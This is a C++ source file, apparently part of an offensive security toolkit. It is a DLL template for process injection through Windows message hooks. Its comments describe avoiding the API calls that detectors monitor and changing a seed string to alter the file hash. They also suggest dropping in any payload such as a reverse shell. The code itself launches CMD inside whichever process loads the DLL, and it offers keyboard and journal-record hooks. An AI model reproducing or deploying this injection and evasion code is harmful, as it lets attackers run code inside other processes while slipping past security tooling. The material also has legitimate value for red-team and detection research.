// Copyright (c) 2021 Ivan Šincek

#include "pch.h"
#include <string>
#pragma  comment(lib, "user32")

// NOTE: The point of this DLL and injection is to avoid calling LoadLibrary(), WriteProcessMemory(), CreateRemoteThread(), etc.
// NOTE: You can use whatever payload you want, e.g. reverse shell, etc.

// NOTE: Change the seed to change the file hash.
std::string seed = "3301Kira";

// NOTE: Process will run in a new window.
void RunProcess(std::string file, std::string args = "") {
	PROCESS_INFORMATION pInfo = { };
	STARTUPINFOA sInfo = { };
	sInfo.cb = sizeof(sInfo);
	if (CreateProcessA(file.length() > 0 ? file.c_str() : NULL, (LPSTR)args.c_str(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &sInfo, &pInfo) != 0) {
		CloseHandle(pInfo.hThread); CloseHandle(pInfo.hProcess);
	}
}

// NOTE: Do not change the name of this method. This method is required.
// NOTE: Feel free to change the content of this method - make your own hook procedure.
extern "C" __declspec(dllexport) LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// NOTE: Uncomment if you want to run your payload every time a message is captured, e.g. on every mouse click, key press, etc.
	// RunProcess("", "CMD");
	// NOTE: Don't block the message queue.
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// NOTE: Do not change the name of this method. This method is required.
// NOTE: Change the return value (i.e. hook type) as necessary.
extern "C" __declspec(dllexport) int GetHookType() {
	// return WH_CALLWNDPROC;
	// return WH_CALLWNDPROCRET;
	// return WH_CBT;
	// return WH_DEBUG;
	// return WH_FOREGROUNDIDLE;
	// return WH_GETMESSAGE;
	// return WH_JOURNALPLAYBACK;
	// return WH_JOURNALRECORD;
	// return WH_KEYBOARD;
	// return WH_KEYBOARD_LL;
	return WH_MOUSE;
	// return WH_MOUSE_LL;
	// return WH_MSGFILTER;
	// return WH_SHELL;
	// return WH_SYSMSGFILTER;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		// NOTE: You can also try to play with this.
		case DLL_PROCESS_ATTACH: { // NOTE: This case will run on DLL load once per process - e.g. upon DLL injection.
			// NOTE: DLL will load once the first message is captured, e.g. on the first mouse click, key press, etc.
			RunProcess("", "CMD");
			break;
		}
		case DLL_PROCESS_DETACH: { // NOTE: This case will run on DLL unload once per process.
			break;
		}
		case DLL_THREAD_ATTACH:  { // NOTE: This case will run on DLL load multiple times per process.
			break;
		}
		case DLL_THREAD_DETACH:  { // NOTE: This case will run on DLL unload multiple times per process.
			break;
		}
	}
	return TRUE;
}
